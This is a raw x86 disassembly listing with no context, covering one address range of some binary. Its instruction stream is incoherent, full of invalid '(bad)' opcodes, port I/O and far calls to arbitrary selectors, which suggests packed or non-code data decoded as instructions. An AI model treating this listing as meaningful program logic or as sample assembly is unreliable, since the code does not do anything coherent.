  409cac:	ins    DWORD PTR es:[edi],dx
  409cad:	cmp    al,ch
  409caf:	rcl    DWORD PTR [edx],cl
  409cb1:	pop    ebp
  409cb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cb3:	imul   ebp,DWORD PTR [eax+0x54],0xa40f599e
  409cba:	imul   eax,DWORD PTR [edx-0x51],0xdc79b093
  409cc1:	cmp    eax,0x5ef6174a
  409cc6:	out    dx,al
  409cc7:	in     al,0x81
  409cc9:	sub    edi,DWORD PTR [ebx+0x60a3f45d]
  409ccf:	mov    ah,0xe6
  409cd1:	daa    
  409cd2:	pushf  
  409cd3:	xor    BYTE PTR [ecx],bl
  409cd5:	adc    al,0xcf
  409cd7:	ds out dx,eax
  409cd9:	aas    
  409cda:	mov    dh,0x2e
  409cdc:	outs   dx,DWORD PTR ds:[esi]
  409cdd:	cmp    al,0xb5
  409cdf:	or     eax,DWORD PTR [esi-0x113b483c]
  409ce5:	dec    ebp
  409ce6:	fidiv  DWORD PTR [ebx+0xab69ece]
  409cec:	jae    0x409caa
  409cee:	sub    dh,BYTE PTR [eax+eax*4+0x545ff195]
  409cf5:	sbb    ecx,DWORD PTR [ebx+esi*1-0x4cb80459]
  409cfc:	xchg   ebp,eax
  409cfd:	lea    ebx,[eax-0x4a57e5ce]
  409d03:	mov    esi,0x70481750
  409d08:	loopne 0x409cac
  409d0a:	(bad)  
  409d0b:	mov    ebp,edi
  409d0d:	sar    ecx,cl
  409d0f:	hlt    
  409d10:	inc    ecx
  409d11:	dec    ebx
  409d12:	sbb    eax,0x17db5103
  409d17:	outs   dx,BYTE PTR ds:[esi]
  409d18:	or     DWORD PTR [edi+edx*2],ecx
  409d1b:	loopne 0x409d6e
  409d1d:	mov    DWORD PTR [esi+eax*4],edx
  409d20:	mov    esi,0x51cf0010
  409d25:	fs cld 
  409d27:	add    ebp,DWORD PTR [esi+0x7e]
  409d2a:	stos   DWORD PTR es:[edi],eax
  409d2b:	mov    ds:0x42efa778,eax
  409d30:	call   0xd4e6:0x9264a492
  409d37:	cmp    dh,BYTE PTR [ecx+ebx*4-0x70]
  409d3b:	sbb    edi,DWORD PTR [ebx-0x9]
  409d3e:	sub    al,0x7a
  409d40:	mov    esi,0x883ded57
  409d45:	hlt    
  409d46:	mov    edi,0x313eeda7
  409d4b:	out    0x6d,al
  409d4d:	stos   DWORD PTR es:[edi],eax
  409d4e:	inc    edx
  409d4f:	push   esp
  409d50:	popf   
  409d51:	push   ss
  409d52:	fnstsw WORD PTR [eax-0x3]
  409d55:	nop
  409d56:	dec    ecx
  409d57:	pop    edx
  409d58:	xor    ecx,DWORD PTR [edx]
  409d5a:	or     esi,DWORD PTR [ebx-0x27533aa4]
  409d60:	fdivrp st(0),st
  409d62:	ds daa 
  409d64:	xchg   ebp,eax
  409d65:	sub    DWORD PTR [edi-0x68],0x783ab88c
  409d6c:	inc    eax
  409d6d:	mov    al,ds:0x392ca9d5
  409d72:	hlt    
  409d73:	pop    ebp
  409d74:	mov    edx,0x5e63492a
  409d79:	and    esp,esp
  409d7b:	(bad)  
  409d7c:	in     eax,0xa1
  409d7e:	push   0xffffffc6
  409d80:	sub    eax,0xe42dd1f2
  409d85:	adc    dh,BYTE PTR [ebp-0x22219a8d]
  409d8b:	scas   eax,DWORD PTR es:[edi]
  409d8c:	adc    esp,DWORD PTR [ebp-0x64]
  409d8f:	mov    bh,0x86
  409d91:	sub    edi,0xfffffff8
  409d94:	mov    al,0xc1
  409d96:	scas   eax,DWORD PTR es:[edi]
  409d97:	cmp    eax,0xe8104f93
  409d9c:	jns    0x409d59
  409d9e:	lods   al,BYTE PTR ds:[esi]
  409d9f:	pop    ds
  409da0:	cmp    ch,dl
  409da2:	add    dh,dl
  409da4:	xchg   esi,eax
  409da5:	enter  0x8099,0x7a
  409da9:	out    dx,al
  409daa:	pop    esi
  409dab:	lods   al,BYTE PTR ds:[esi]
  409dac:	sti    
  409dad:	cmp    eax,0x2e5d2fbe
  409db2:	fs xor eax,0x8ac96470
  409db8:	inc    esi
  409db9:	jae    0x409e1c
  409dbb:	fbld   TBYTE PTR [esi-0x15e9f1d8]
  409dc1:	cmp    edx,ebx
  409dc3:	(bad)  
  409dc4:	mov    al,0x7d
  409dc6:	sub    al,0x6a
  409dc8:	je     0x409d7b
  409dca:	cmp    eax,0x28de50cc
  409dcf:	mov    WORD PTR [ecx+0x4e5bcb05],?
  409dd5:	pop    ebp
  409dd6:	xchg   esp,eax
  409dd7:	mov    cl,0x9c
  409dd9:	pop    ds
  409dda:	gs pop edi
  409ddc:	and    BYTE PTR [edi-0x4d],cl
  409ddf:	lods   eax,DWORD PTR ds:[esi]
  409de0:	push   ss
  409de1:	sbb    BYTE PTR [edi+0x5f],bh
  409de4:	sbb    ebx,DWORD PTR [eax-0x3910964d]
  409dea:	outs   dx,DWORD PTR ds:[esi]
  409deb:	dec    eax
  409dec:	dec    ecx
  409ded:	fsubrp st(3),st
  409def:	and    BYTE PTR [edi-0x5341ed5a],0x1
  409df6:	sub    esi,edi
  409df8:	aam    0x90
  409dfa:	jae    0x409e08
  409dfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409dfd:	sbb    al,0x6d
  409dff:	cli    
  409e00:	pop    esp
  409e01:	mov    ch,0x5e
  409e03:	cmp    eax,0x363b28bb
  409e08:	call   0xd0d7:0x39023eb3
  409e0f:	ficomp WORD PTR [ebp+0x52]
  409e12:	bnd jb 0x409e5c
  409e15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e16:	mov    edx,0xa85d30a4
  409e1b:	xchg   ecx,eax
  409e1c:	call   0xa682:0x5e370cc1
  409e23:	lea    edx,[eax-0x1be15f11]
  409e29:	jg     0x409e41
  409e2b:	xchg   esi,eax
  409e2c:	fs pop esi
  409e2e:	jns    0x409df8
  409e30:	out    dx,eax
  409e31:	mov    ch,0xa1
  409e33:	ret    
  409e34:	popa   
  409e35:	vpunpcklbw ymm7,ymm5,YMMWORD PTR [edi+0x22]
  409e3a:	fisub  DWORD PTR [ebp-0x3cf19c42]
  409e40:	nop
  409e41:	xchg   ecx,eax
  409e42:	sub    ch,0x39
  409e45:	clc    
  409e46:	inc    edi
  409e47:	jb     0x409dcf
  409e49:	int    0x2f
  409e4b:	fs cmc 
  409e4d:	xchg   ecx,eax
  409e4e:	not    BYTE PTR [ebp+0x34d243c4]
  409e54:	ins    DWORD PTR es:[edi],dx
  409e55:	les    ebp,FWORD PTR [edx-0x4]
  409e58:	fldenv [esi]
  409e5a:	inc    edi
  409e5b:	stos   DWORD PTR es:[edi],eax
  409e5c:	cmp    edx,DWORD PTR [esi+0x246a49ec]
  409e62:	add    esp,esi
  409e64:	push   esi
  409e65:	test   DWORD PTR [edx-0x3b47e4c9],ebx
  409e6b:	fdivr  DWORD PTR [ecx-0x11]
  409e6e:	add    al,0x8e
  409e70:	fs pop es
  409e72:	call   0xba9eb11c
  409e77:	dec    ebx
  409e78:	jle    0x409e98
  409e7a:	int3   
  409e7b:	in     al,0x47
  409e7d:	xchg   ecx,eax
  409e7e:	cs pop ds
  409e80:	mov    ah,0x8a
  409e82:	inc    esp
  409e83:	loopne 0x409e47
  409e85:	or     ebx,DWORD PTR [ecx+ebp*8-0x7a1ddc29]
  409e8c:	pushf  
  409e8d:	shr    BYTE PTR [edx],cl
  409e8f:	ret    
  409e90:	int3   
  409e91:	mov    al,0x5b
  409e93:	mov    edx,0xcd21dc35
  409e98:	push   ebx
  409e99:	ja     0x409e37
  409e9b:	push   esp
  409e9c:	xchg   edi,eax
  409e9d:	fisub  DWORD PTR gs:[esi+0x778d97ef]
  409ea4:	mov    esi,0x19364f17
  409ea9:	fimul  WORD PTR [eax+ebx*1-0x509c58dc]
  409eb0:	mov    al,0x11
  409eb2:	push   es
  409eb3:	daa    
  409eb4:	adc    cl,BYTE PTR [ebx-0x3b]
  409eb7:	jl     0x409efb
  409eb9:	or     BYTE PTR [edi-0x7b],ch
  409ebc:	xchg   esp,eax
  409ebd:	fsub   QWORD PTR [ecx]
  409ebf:	mov    dl,0x5e
  409ec1:	popa   
  409ec2:	add    edi,DWORD PTR [esi+0x57]
  409ec5:	mov    dl,0x40
  409ec7:	aam    0xf8
  409ec9:	push   ss
  409eca:	xor    eax,0x34cf908b
  409ecf:	shl    DWORD PTR fs:[edi+eax*4+0x6d4eb3ba],1
  409ed7:	jmp    0x5d92:0xfedaea8e
  409ede:	loop   0x409f17
  409ee0:	xor    al,0xca
  409ee2:	nop
  409ee3:	xlat   BYTE PTR ds:[ebx]
  409ee4:	cmp    BYTE PTR [ecx],al
  409ee6:	mov    DWORD PTR [edi-0x5124cc25],ebp
  409eec:	jns    0x409efb
  409eee:	mov    ebp,0x715f8b0e
  409ef3:	mov    WORD PTR [edx-0x1d],cs
  409ef6:	push   0x42
  409ef8:	mov    dl,0xaf
  409efa:	icebp  
  409efb:	cwde   
  409efc:	and    eax,0x54280fbe
  409f01:	hlt    
  409f02:	and    cl,BYTE PTR [edi]
  409f04:	inc    edi
  409f05:	cmp    dh,BYTE PTR [ebp+0x43b15041]
  409f0b:	ret    
  409f0c:	cmp    al,0x87
  409f0e:	push   esi
  409f0f:	ret    0x2a95
  409f12:	imul   edx,DWORD PTR [ebx],0x99019160
  409f18:	pop    ebx
  409f19:	adc    DWORD PTR [eax],edx
  409f1b:	jo     0x409ec6
  409f1d:	adc    al,0xa3
  409f1f:	mov    ah,0x55
  409f21:	(bad)  
  409f22:	jbe    0x409f8a
  409f24:	test   ah,ah
  409f26:	inc    edi
  409f27:	js     0x409eee
  409f29:	pop    ebp
  409f2a:	and    eax,0x4b546112
  409f2f:	xchg   esp,eax
  409f30:	mov    edi,0xd5ad6d3b
  409f35:	or     BYTE PTR [edi-0x43],al
  409f38:	adc    ch,ah
  409f3a:	mov    cl,0xa4
  409f3c:	dec    edi
  409f3d:	pop    ebx
  409f3e:	xor    ecx,DWORD PTR [edx]
  409f40:	call   ebx
  409f42:	dec    ebp
  409f43:	and    al,0xcb
  409f45:	(bad)  
  409f46:	call   0xff64314b
  409f4b:	icebp  
  409f4c:	add    DWORD PTR [esi],ecx
  409f4e:	ins    BYTE PTR es:[edi],dx
  409f4f:	push   cs
  409f50:	shl    BYTE PTR [ebx-0x4a],cl
  409f53:	pusha  
  409f54:	scas   eax,DWORD PTR es:[edi]
  409f55:	scas   al,BYTE PTR es:[edi]
  409f56:	imul   edx,ebp,0x67
  409f59:	dec    esi
  409f5a:	lahf   
  409f5b:	hlt    
  409f5c:	lock fs ins BYTE PTR es:[edi],dx
  409f5f:	and    eax,0xfc517370
  409f64:	mov    eax,ds:0xeb28e753
  409f69:	mov    bh,0x66
  409f6b:	imul   edi,ebp,0x7e
  409f6e:	addr16 mov bl,0xaf
  409f71:	ss das 
  409f73:	pop    ebp
  409f74:	arpl   ax,di
  409f76:	jne    0x409fae
  409f78:	repnz icebp 
  409f7a:	add    ebx,DWORD PTR [edx+0x63]
  409f7d:	das    
  409f7e:	dec    eax
  409f7f:	xchg   esp,eax
  409f80:	adc    al,cl
  409f82:	icebp  
  409f83:	stc    
  409f84:	retf   
  409f85:	les    eax,FWORD PTR [esi]
  409f87:	xchg   edi,eax
  409f88:	or     ecx,esp
  409f8a:	std    
  409f8b:	sbb    eax,0xc479128f
  409f90:	and    ecx,DWORD PTR [ecx+0x61]
  409f93:	push   ss
  409f94:	or     cl,BYTE PTR [edi+0x17]
  409f97:	retf   
  409f98:	mov    eax,0x6f9d2ed2
  409f9d:	sub    BYTE PTR [eax+ebp*2-0x28],al
  409fa1:	or     bl,BYTE PTR [ebx+0x7f]
  409fa4:	sbb    DWORD PTR [esi+ebx*1],ebp
  409fa7:	push   esi
  409fa8:	imul   eax,DWORD PTR [edi+0xb],0xffffff84
  409fac:	inc    edi
  409fad:	fwait
  409fae:	pop    eax
  409faf:	fwait
  409fb0:	aas    
  409fb1:	add    al,0xd2
  409fb3:	adc    eax,0x8fd077cc
  409fb8:	mov    eax,ds:0x7433c183
  409fbd:	aad    0x75
  409fbf:	fwait
  409fc0:	and    eax,0xaf51c96c
  409fc5:	lahf   
  409fc6:	scas   eax,DWORD PTR es:[edi]
  409fc7:	sbb    al,0xd2
  409fc9:	out    dx,al
  409fca:	shl    bl,cl
  409fcc:	push   edx
  409fcd:	pushf  
  409fce:	leave  
  409fcf:	nop
  409fd0:	call   0xcf7f2cc8
  409fd5:	aam    0xfa
  409fd7:	dec    edx
  409fd8:	jmp    0x775466e1
  409fdd:	dec    esi
  409fde:	mov    al,0xe
  409fe0:	pop    ecx
  409fe1:	xchg   esi,eax
  409fe2:	daa    
  409fe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fe4:	aas    
  409fe5:	fdivr  DWORD PTR [esi-0x2c559004]
  409feb:	inc    ebp
  409fec:	mov    bl,0x7e
  409fee:	pop    ebx
  409fef:	call   0x4099:0x376f1b92
  409ff6:	ret    
  409ff7:	stc    
  409ff8:	xchg   esi,eax
  409ff9:	jno    0x40a050
  409ffb:	iret   
  409ffc:	jnp    0x409ff1
  409ffe:	nop
  409fff:	mov    eax,ds:0xa39a8558
  40a004:	jle    0x40a000
  40a006:	adc    eax,0x7dea554c
  40a00b:	add    dh,BYTE PTR [ebx]
  40a00d:	(bad)  
  40a00f:	fild   DWORD PTR [esi+0x72]
  40a012:	int    0x62
  40a014:	cmp    eax,0xf0f2a7a4
  40a019:	js     0x40a04d
  40a01b:	call   0x24614bbd
  40a020:	(bad)  
  40a021:	ss popa 
  40a023:	hlt    
  40a024:	mov    ds,WORD PTR [ebx+0x59883a6]
  40a02a:	push   edx
  40a02b:	hlt    
  40a02c:	jmp    0x1c9d:0x3cca3bd4
  40a033:	pushf  
  40a034:	mov    dh,0x82
  40a036:	sub    bl,BYTE PTR [edi]
  40a038:	inc    esp
  40a039:	sub    eax,0xa26dfd30
  40a03e:	enter  0x3cff,0xa3
  40a042:	mov    ds:0x9269abf1,eax
  40a047:	(bad)  
  40a048:	jns    0x409fed
  40a04a:	pop    ebp
  40a04b:	push   ecx
  40a04c:	sbb    al,0x6
  40a04e:	xchg   esp,eax
  40a04f:	retf   
  40a050:	fdiv   DWORD PTR [edx]
  40a052:	enter  0x4745,0x9f
  40a056:	mov    ecx,0x742c7456
  40a05b:	cwde   
  40a05c:	jo     0x40a0c9
  40a05e:	jae    0x40a09a
  40a060:	add    dh,BYTE PTR [ecx+eax*1-0x3e5f2627]
  40a067:	ret    
  40a068:	data16 std 
  40a06a:	xchg   DWORD PTR ds:0xf83a9977,ebp
  40a070:	pop    ebx
  40a071:	add    DWORD PTR [edx-0x1e98fd1e],edi
  40a077:	out    0xb5,al
  40a079:	call   0x8287e8c8
  40a07e:	push   esi
  40a07f:	into   
  40a080:	outs   dx,BYTE PTR ds:[esi]
  40a081:	(bad)  
  40a082:	cld    
  40a083:	idiv   DWORD PTR [edx-0x1bef2d11]
  40a089:	fimul  WORD PTR ds:0x3a9f29bc
  40a08f:	and    eax,0xaf736383
  40a094:	xlat   BYTE PTR ds:[ebx]
  40a095:	jg     0x40a0b1
  40a097:	push   eax
  40a098:	pop    ebp
  40a099:	in     eax,0xea
  40a09b:	mov    dl,0x63
  40a09d:	daa    
  40a09e:	in     al,dx
  40a09f:	call   0xc70d:0xa51f7b2c
  40a0a6:	outs   dx,BYTE PTR ds:[esi]
  40a0a7:	inc    ebp
  40a0a8:	cmc    
  40a0a9:	icebp  
  40a0aa:	adc    BYTE PTR [eax-0x86f1e7a],dl
  40a0b0:	cli    
  40a0b1:	rcr    eax,1
  40a0b3:	cmp    dl,al
  40a0b5:	or     eax,0x58cba554
  40a0ba:	xor    DWORD PTR ds:0x3eb8eb07,0xffffffac
  40a0c1:	jecxz  0x40a048
  40a0c3:	xor    ebx,DWORD PTR [eax-0x32]
  40a0c6:	out    dx,al
  40a0c7:	dec    esi
  40a0c8:	cwde   
  40a0c9:	stos   DWORD PTR es:[edi],eax
  40a0ca:	add    al,0x43
  40a0cc:	jne    0x40a139
  40a0ce:	les    esi,FWORD PTR [ebx-0x2c42c807]
  40a0d4:	inc    ecx
  40a0d5:	test   al,0xc2
  40a0d7:	cmp    esi,DWORD PTR [edi-0x68]
  40a0da:	sbb    al,0xc9
  40a0dc:	fistp  QWORD PTR [edi-0x5e98efb6]
  40a0e2:	cmp    al,0xe7
  40a0e4:	dec    edx
  40a0e5:	(bad)  
  40a0e6:	(bad)  
  40a0e7:	pop    edi
  40a0e8:	xchg   ecx,eax
  40a0e9:	retf   
  40a0ea:	dec    eax
  40a0eb:	fs (bad) 
  40a0ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0ee:	ins    BYTE PTR es:[edi],dx
  40a0ef:	mov    eax,ds:0xcbe4f93e
  40a0f4:	adc    BYTE PTR [esi+0x79cd7219],ah
  40a0fa:	jge    0x40a114
  40a0fc:	repz dec ebx
  40a0fe:	std    
  40a0ff:	int3   
  40a100:	fld    QWORD PTR [eax-0x5]
  40a103:	and    ebx,DWORD PTR [esi]
  40a105:	out    0xb8,eax
  40a107:	popa   
  40a108:	pop    ebx
  40a109:	xor    DWORD PTR [ebx],0x97fa93ac
  40a10f:	outs   dx,BYTE PTR ds:[esi]
  40a110:	sti    
  40a111:	out    dx,al
  40a112:	mov    ds:0xf85a13d6,eax
  40a117:	jecxz  0x40a0e7
  40a119:	(bad)  
  40a11a:	mov    eax,0xf9541dae
  40a11f:	mov    dl,0x9
  40a121:	xor    DWORD PTR [edx+ebx*2+0x2e45d3de],0x8
  40a129:	xor    al,0x1
  40a12b:	xchg   ecx,eax
  40a12c:	pop    edi
  40a12d:	adc    BYTE PTR [eax],ah
  40a12f:	rol    DWORD PTR ds:0xf7ec0b60,0x74
  40a136:	xor    ebp,edi
  40a138:	(bad)  
  40a139:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a13a:	test   al,0x33
  40a13c:	shl    BYTE PTR [ecx-0x22700694],cl
  40a142:	(bad)  
  40a144:	and    bl,ah
  40a146:	(bad)  
  40a148:	lds    eax,FWORD PTR [ebp+ebx*2+0x40dc3d63]
  40a14f:	xchg   DWORD PTR [eax+eax*2+0x6f],ecx
  40a153:	xor    ch,BYTE PTR [ebx-0x41]
  40a156:	stc    
  40a157:	and    edx,edi
  40a159:	or     eax,0xf58f7339
  40a15e:	(bad)  
  40a15f:	xchg   ebx,eax
  40a160:	hlt    
  40a161:	mov    edi,0xe297adf2
  40a166:	das    
  40a167:	lock lahf 
  40a169:	repz test BYTE PTR [edx],ch
  40a16c:	sub    esp,0xffffff88
  40a16f:	lods   al,BYTE PTR ds:[esi]
  40a170:	outs   dx,BYTE PTR ds:[esi]
  40a171:	add    bl,BYTE PTR [edx+eax*8-0x37]
  40a175:	sub    esp,0xffffffc5
  40a178:	out    0x5,al
  40a17a:	pusha  
  40a17b:	(bad)  
  40a17c:	loopne 0x40a1fd
  40a17e:	repz jmp 0x40a1c9
  40a181:	sahf   
  40a182:	fld    QWORD PTR [esi-0x6b576669]
  40a188:	(bad)  
  40a189:	pop    edx
  40a18a:	mov    DWORD PTR [edi+ecx*1],0x9b57fe66
  40a191:	fcmovnu st,st(0)
  40a193:	jne    0x40a1ba
  40a195:	cmc    
  40a196:	out    dx,eax
  40a197:	gs stos BYTE PTR es:[edi],al
  40a199:	mov    DWORD PTR [edx+0x52],ebx
  40a19c:	pop    ebx
  40a19d:	xlat   BYTE PTR ds:[ebx]
  40a19e:	adc    bl,BYTE PTR [edx]
  40a1a0:	and    al,0x36
  40a1a2:	mov    ds:0xe322e522,eax
  40a1a7:	dec    edi
  40a1a8:	(bad)  
  40a1a9:	fcomp  QWORD PTR gs:[ebx]
  40a1ac:	mov    edi,0x57aea68e
  40a1b1:	in     eax,dx
  40a1b2:	scas   al,BYTE PTR es:[edi]
  40a1b3:	jle    0x40a1c3
  40a1b5:	pop    esi
  40a1b6:	(bad)  
  40a1b7:	call   0xd3697cf2
  40a1bc:	jae    0x40a19f
  40a1be:	adc    DWORD PTR [ebx+0x62],0xb5f2b4aa
  40a1c5:	mov    eax,ds:0x976db2b
  40a1ca:	and    al,0x3b
  40a1cc:	les    eax,FWORD PTR [ebx+0x5a]
  40a1cf:	inc    eax
  40a1d0:	fisubr DWORD PTR ds:0x6e08958c
  40a1d6:	out    0x61,eax
  40a1d8:	pop    ebp
  40a1d9:	js     0x40a1f6
  40a1db:	add    esi,DWORD PTR [edx+0x5cacdcb6]
  40a1e1:	xor    eax,0x4dceb3a2
  40a1e6:	jge    0x40a224
  40a1e8:	mov    BYTE PTR [esi+eiz*8],bl
  40a1eb:	sbb    DWORD PTR [ebx+edi*8],esi
  40a1ee:	pop    ss
  40a1ef:	pop    ebp
  40a1f0:	and    edi,ebp
  40a1f2:	call   0xbd63a232
  40a1f7:	mov    ch,0x8f
  40a1f9:	push   cs
  40a1fa:	pop    edx
  40a1fb:	xchg   BYTE PTR [ebp-0x2e],al
  40a1fe:	adc    eax,0xbc452964
  40a203:	add    eax,0xaaa1516a
  40a208:	cli    
  40a209:	dec    esp
  40a20a:	or     eax,0xef614577
  40a20f:	out    dx,eax
  40a210:	pusha  
  40a211:	aas    
  40a212:	rcl    DWORD PTR [ecx+eiz*1],1
  40a215:	in     al,dx
  40a216:	jle    0x40a263
  40a218:	inc    ebp
  40a219:	adc    ecx,DWORD PTR [ecx]
  40a21b:	xchg   edi,eax
  40a21c:	mov    esi,0xd230902a
  40a221:	idiv   DWORD PTR [esi+0x2c]
  40a224:	xor    esi,DWORD PTR [ebx+0x66]
  40a227:	mov    ecx,0x8095c359
  40a22c:	cmp    DWORD PTR [eax],esp
  40a22e:	rol    BYTE PTR [eax-0x23498aec],1
  40a234:	sbb    ebp,DWORD PTR [edi+0x7b]
  40a237:	mov    ch,0x75
  40a239:	out    0x7,eax
  40a23b:	cmp    al,0xf4
  40a23d:	(bad)  [ebx+0x344d2547]
  40a243:	std    
  40a244:	cwde   
  40a245:	lahf   
  40a246:	xchg   ebp,eax
  40a247:	fnstsw WORD PTR [edi-0x4d]
  40a24a:	jle    0x40a214
  40a24c:	xchg   edx,eax
  40a24d:	pop    es
  40a24e:	loopne 0x40a294
  40a250:	in     eax,dx
  40a251:	or     bh,BYTE PTR [esi-0x7e]
  40a254:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a255:	xor    eax,0xd879150c
  40a25a:	icebp  
  40a25b:	jb     0x40a1e5
  40a25d:	mov    cl,BYTE PTR [edx]
  40a25f:	jbe    0x40a267
  40a261:	and    ah,BYTE PTR [edx]
  40a263:	in     al,0x3e
  40a265:	jns    0x40a25d
  40a267:	neg    eax
  40a269:	add    ch,BYTE PTR [edi+0x24]
  40a26c:	lock dec edi
  40a26e:	sub    ch,0x33
  40a271:	inc    eax
  40a272:	(bad)  
  40a273:	fld    QWORD PTR [esi+0x511c455]
  40a279:	cli    
  40a27a:	imul   ecx,esp,0xe63fdb47
  40a280:	jae    0x40a2e8
  40a282:	mov    ds:0xf6c61f75,al
  40a287:	sahf   
  40a288:	shr    DWORD PTR [ebx+edx*8-0x4a],0x2f
  40a28d:	xchg   ebx,eax
  40a28e:	outs   dx,BYTE PTR ds:[esi]
  40a28f:	xchg   edi,eax
  40a290:	mov    edx,0x7b3ebcd9
  40a295:	adc    al,0x58
  40a297:	pop    es
  40a298:	int3   
  40a299:	dec    ecx
  40a29a:	jo     0x40a23a
  40a29c:	sub    edi,0xbd72d525
  40a2a2:	pop    edi
  40a2a3:	ds pop esi
  40a2a5:	xchg   esp,eax
  40a2a6:	mov    ds:0x712e60a6,al
  40a2ab:	test   al,0x38
  40a2ad:	mov    bh,0x42
  40a2af:	or     al,0x6
  40a2b1:	xchg   edi,eax
  40a2b2:	jns    0x40a299
  40a2b4:	jp     0x40a254
  40a2b6:	dec    ebx
  40a2b7:	fld    QWORD PTR [ecx-0x39605a4f]
  40a2bd:	sahf   
  40a2be:	call   0x50d0c2aa
  40a2c3:	lea    edi,ds:0xc36e39b4
  40a2c9:	int    0xd9
  40a2cb:	mov    ds:0xf65e45d3,eax
  40a2d0:	jle    0x40a296
  40a2d2:	aas    
  40a2d3:	or     DWORD PTR [ecx-0x68],ebp
  40a2d6:	icebp  
  40a2d7:	mov    bl,0x2
  40a2d9:	sub    bh,BYTE PTR [edx-0x4da92321]
  40a2df:	jbe    0x40a311
  40a2e1:	sbb    DWORD PTR [eax+ecx*1],ebx
  40a2e4:	or     dl,bl
  40a2e6:	arpl   WORD PTR [eax+eiz*8],si
  40a2e9:	inc    eax
  40a2ea:	(bad)  
  40a2eb:	loopne 0x40a2e5
  40a2ed:	mov    cl,BYTE PTR [edi-0x51]
  40a2f0:	xchg   ebx,eax
  40a2f1:	call   0xa711:0x9e3af698
  40a2f8:	push   esp
  40a2f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2fa:	inc    esp
  40a2fb:	add    eax,0x42450355
  40a300:	pop    edx
  40a301:	dec    esi
  40a302:	dec    ecx
  40a303:	into   
  40a304:	mov    ss,WORD PTR ds:0x96d5e40d
  40a30a:	je     0x40a32f
  40a30c:	loope  0x40a2b2
  40a30e:	cwde   
  40a30f:	and    al,0xd6
  40a311:	mov    ebx,0xdab9e6f
  40a316:	xchg   edx,eax
  40a317:	loopne 0x40a358
  40a319:	nop
  40a31a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a31b:	dec    esp
  40a31c:	lds    esp,FWORD PTR [edx]
  40a31e:	mov    ebp,?
  40a320:	mov    esi,ebp
  40a322:	cmp    BYTE PTR [ebp-0x43e16a4c],ah
  40a328:	pusha  
  40a329:	jnp    0x40a313
  40a32b:	push   ds
  40a32c:	pop    ecx
  40a32d:	pop    DWORD PTR [eax]
  40a32f:	xchg   esi,eax
  40a330:	cmp    BYTE PTR [edx+0x113e102],bl
  40a336:	pushf  
  40a337:	xor    dh,BYTE PTR [esi+0x59]
  40a33a:	sti    
  40a33b:	or     edi,ecx
  40a33d:	fidiv  WORD PTR [eax+0x1d44bbc9]
  40a343:	je     0x40a386
  40a345:	shr    BYTE PTR [edx+edi*1],1
  40a348:	sbb    dl,BYTE PTR [esi+0x65]
  40a34b:	dec    edx
  40a34c:	ret    
  40a34d:	unpckhps xmm1,XMMWORD PTR [edx+ecx*2-0xd]
  40a352:	jle    0x40a384
  40a354:	mov    ebp,0xbf807b60
  40a359:	out    0xd,al
  40a35b:	inc    BYTE PTR [ebx]
  40a35d:	cmp    ch,BYTE PTR [esp+ebp*2]
  40a360:	push   ecx
  40a361:	loopne 0x40a358
  40a363:	jns    0x40a307
  40a365:	or     esp,eax
  40a367:	push   ebp
  40a368:	mov    esp,0xe8e16d9e
  40a36d:	adc    eax,0x7feb0af8
  40a372:	pop    ebp
  40a373:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a374:	fldenv ds:0xc79bbf9e
  40a37a:	sub    eax,0x763095b9
  40a37f:	mov    esp,0x5f176a51
  40a384:	lea    esi,[eax+esi*1-0x9]
  40a388:	jle    0x40a392
  40a38a:	dec    ebx
  40a38b:	inc    ebp
  40a38c:	xor    bl,BYTE PTR [ebp-0x67580f67]
  40a392:	or     BYTE PTR [edx],bl
  40a394:	iret   
  40a395:	icebp  
  40a396:	repnz pop ss
  40a398:	mov    bl,0x40
  40a39a:	mov    al,0x33
  40a39c:	adc    eax,0xca9182ba
  40a3a1:	mov    ebp,0xd4ad4ece
  40a3a6:	in     al,0x58
  40a3a8:	add    DWORD PTR [esi+0x31544d75],edx
  40a3ae:	into   
  40a3af:	cmp    BYTE PTR fs:[ebp+edi*1-0x4c],ch
  40a3b4:	pushf  
  40a3b5:	(bad)  
  40a3b6:	inc    esp
  40a3b7:	sbb    al,0xeb
  40a3b9:	das    
  40a3ba:	mov    edi,0xf448485f
  40a3bf:	lock lea eax,ds:[edx-0x22]
  40a3c4:	mov    cl,0xb0
  40a3c6:	mov    dl,0x6f
  40a3c8:	sub    dl,BYTE PTR [eax+0x51]
  40a3cb:	scas   eax,DWORD PTR es:[edi]
  40a3cc:	or     edi,DWORD PTR [ebp+0x79]
  40a3cf:	fwait
  40a3d0:	mov    ch,0x1
  40a3d2:	ret    
  40a3d3:	in     al,0x2f
  40a3d5:	push   0x56630d74
  40a3da:	jbe    0x40a3a5
  40a3dc:	mov    esi,0xe0febc
  40a3e1:	pop    es
  40a3e2:	sar    eax,cl
  40a3e4:	icebp  
  40a3e5:	jecxz  0x40a372
  40a3e7:	and    dl,BYTE PTR [ebx+esi*8+0x5bd3dc91]
  40a3ee:	and    DWORD PTR [edx+0x53],0x4f
  40a3f2:	test   BYTE PTR [ebp-0x731a7945],bh
  40a3f8:	pop    esi
  40a3f9:	adc    BYTE PTR [eax-0x6f6ec557],cl
  40a3ff:	cmp    dh,cl
  40a401:	(bad)  
  40a402:	sbb    BYTE PTR [esi],dl
  40a404:	xor    DWORD PTR [edi+0x11],esi
  40a407:	add    edi,ecx
  40a409:	xlat   BYTE PTR ds:[ebx]
  40a40a:	lods   eax,DWORD PTR ds:[esi]
  40a40b:	dec    eax
  40a40c:	int3   
  40a40d:	jl     0x40a42f
  40a40f:	aas    
  40a410:	inc    ebp
  40a411:	sub    al,0xff
  40a413:	fdiv   DWORD PTR [ebx+0x5890b18f]
  40a419:	dec    ecx
  40a41a:	es xchg edi,eax
  40a41c:	jno    0x40a492
  40a41e:	dec    edi
  40a41f:	(bad)  
  40a420:	mov    eax,ds:0x15bd006
  40a425:	dec    ecx
  40a426:	test   eax,ecx
  40a428:	out    0xd2,eax
  40a42a:	or     DWORD PTR [ecx],edi
  40a42c:	inc    ebp
  40a42d:	mov    ebx,0x6a1a272b
